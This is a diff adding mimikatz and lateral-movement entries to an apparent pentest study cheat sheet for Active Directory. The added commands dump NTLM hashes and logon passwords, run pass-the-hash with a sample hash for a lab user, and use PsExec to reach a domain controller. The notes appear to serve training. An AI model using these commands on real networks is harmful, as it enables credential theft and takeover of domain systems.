@@ -53,3 +53,27 @@ net user /domain # Enumerate all users in the entire domain.
 net user admin_onur /domain # Enumerate spesific 'admin_onur' user in the domain.
 
 net group /domain # Enumerate all the groups in the domain.
+
+
+
+### mimikatz
+
+privilege::debug # admin
+
+lsadump::lsa /patch # ntlm pass hashes dump
+
+klist #cached tickets
+
+sekurlsa::logonpasswords #dump pass hashes
+
+sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
+
+PsExec64.exe \\dc01 cmd.exe # powershell acildiginda dcye baglan
+
+
+### PowerView
+
+https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview
+
+
+
